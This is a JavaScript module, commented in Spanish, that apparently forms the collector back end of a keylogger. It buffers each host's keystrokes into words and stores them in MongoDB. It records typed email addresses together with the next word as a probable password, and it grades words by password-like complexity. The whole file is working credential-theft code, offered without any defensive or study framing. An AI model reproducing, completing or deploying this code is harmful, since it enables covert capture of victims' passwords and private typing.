// Reconstruye palabras a partir de pulsaciones individuales.
// Mantiene un buffer en memoria por host; cuando una palabra se "cierra"
// (espacio, enter, cambio de ventana, etc.) se guarda en la coleccion Word.
//
// IMPORTANTE: handleKey es SINCRONO para garantizar que las teclas se
// procesan en el orden exacto en que llegan. Las escrituras a MongoDB
// se lanzan en segundo plano (fire-and-forget) y no bloquean el buffer.
//
// Deteccion especial:
//   - Emails: palabras con @ y . → se guardan en Credential.
//     La palabra que viene justo despues se guarda como nextWord.
//   - Complejidad: clasifica palabras por patron de contraseña.

const Word = require('./models/Word');
const Credential = require('./models/Credential');

// Teclas especiales que SOLO cierran la palabra actual.
const CLOSERS = new Set([
  '[ENTER]', '[TAB]', '[ESCAPE]',
  '[LEFT]', '[RIGHT]', '[UP]', '[DOWN]',
  '[HOME]', '[END]', '[PG_UP]', '[PG_DOWN]',
  '[DELETE]', '[INSERT]'
]);

// Modificadores: se ignoran sin cerrar la palabra.
const MODIFIERS = new Set([
  '[SHIFT]', '[LSHIFT]', '[RSHIFT]',
  '[CONTROL]', '[LCONTROL]', '[RCONTROL]',
  '[ALT]', '[LALT]', '[RALT]',
  '[LWIN]', '[RWIN]', '[CAPSLOCK]'
]);

const MIN_LEN = 2;
const MAX_LEN = 200;

// Patron basico de email.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// Buffer por host.
const buffers = new Map();

// Cola de promesas pendientes (para flushAll en shutdown).
const pendingOps = [];

function trackOp(promise) {
  pendingOps.push(promise);
  promise.finally(() => {
    const idx = pendingOps.indexOf(promise);
    if (idx >= 0) pendingOps.splice(idx, 1);
  });
}

function getBuf(host) {
  let b = buffers.get(host);
  if (!b) {
    b = { text: '', window: '', startedAt: null, pendingEmail: null };
    buffers.set(host, b);
  }
  return b;
}

// Clasifica la complejidad de una palabra (case original).
function classifyComplexity(raw) {
  const hasUpper   = /[A-ZÑÁÉÍÓÚÜ]/.test(raw);
  const hasLower   = /[a-zñáéíóúü]/.test(raw);
  const hasDigit   = /[0-9]/.test(raw);
  const hasSpecial = /[^a-zA-Z0-9ñÑáéíóúüÁÉÍÓÚÜ]/.test(raw);

  if (hasUpper && hasLower && hasDigit && hasSpecial) return 'strong';
  if (hasUpper && hasLower && hasDigit)               return 'mixed-case-num';
  if ((hasUpper || hasLower) && hasDigit)              return 'alphanumeric';
  return null;
}

// flush es SINCRONO: captura el estado del buffer y lanza la escritura
// a MongoDB en segundo plano. Asi el buffer queda limpio inmediatamente.
function flush(host) {
  const b = buffers.get(host);
  if (!b || b.text.length === 0) return;

  const raw = b.text;
  const word = raw.toLowerCase();
  const win = b.window;
  const startedAt = b.startedAt || new Date();

  // Limpiar buffer de forma sincrona.
  b.text = '';
  b.startedAt = null;

  if (word.length < MIN_LEN || word.length > MAX_LEN) return;

  // --- Deteccion de email ---
  if (EMAIL_RE.test(word)) {
    trackOp(
      Credential.create({ host, window: win, email: word, nextWord: '', timestamp: startedAt })
        .catch(err => console.error('Credential.create:', err.message))
    );
    b.pendingEmail = { email: word, window: win, timestamp: startedAt };
    return;
  }

  // --- Si la palabra anterior fue un email, esta es la posible contraseña ---
  if (b.pendingEmail) {
    const pe = b.pendingEmail;
    b.pendingEmail = null;
    trackOp(
      Credential.findOneAndUpdate(
        { email: pe.email, host, timestamp: pe.timestamp },
        { nextWord: raw },
        { sort: { timestamp: -1 } }
      ).catch(err => console.error('Credential update:', err.message))
    );
  }

  // Filtrar palabras sin letras.
  if (!/[a-zñáéíóúü]/i.test(word)) return;

  const complexity = classifyComplexity(raw);

  trackOp(
    Word.create({ host, window: win, word: raw, length: raw.length, complexity, timestamp: startedAt })
      .catch(err => console.error('Word.create:', err.message))
  );
}

// handleKey es SINCRONO: nunca usa await.
// Esto garantiza que las teclas se procesan estrictamente en orden.
function handleKey({ host, window, key, timestamp }) {
  const b = getBuf(host);

  // Cambio de ventana → cierra palabra en curso.
  if (b.text.length > 0 && window !== b.window) {
    flush(host);
  }
  b.window = window || '';

  if (!key) return;

  // Modificadores: no hacen nada al buffer.
  if (MODIFIERS.has(key)) return;

  // Backspace: borra ultimo caracter del buffer.
  if (key === '[BACKSPACE]') {
    if (b.text.length > 0) b.text = b.text.slice(0, -1);
    return;
  }

  // Teclas de navegacion / escape: cierran la palabra.
  if (CLOSERS.has(key)) {
    flush(host);
    return;
  }

  // Espacio: cierra la palabra.
  if (key === ' ') {
    flush(host);
    return;
  }

  // Un unico caracter: lo acumulamos.
  if (key.length === 1) {
    if (b.text.length === 0) b.startedAt = timestamp ? new Date(timestamp) : new Date();
    b.text += key;
    if (b.text.length > MAX_LEN) {
      flush(host);
    }
    return;
  }

  // Cualquier otra tecla especial: cerramos por si acaso.
  flush(host);
}

// Vacia todos los buffers y espera a que terminen las escrituras pendientes.
async function flushAll() {
  const hosts = Array.from(buffers.keys());
  for (const h of hosts) flush(h);
  await Promise.allSettled([...pendingOps]);
}

function reset() {
  buffers.clear();
  pendingOps.length = 0;
}

module.exports = { handleKey, flush, flushAll, reset };
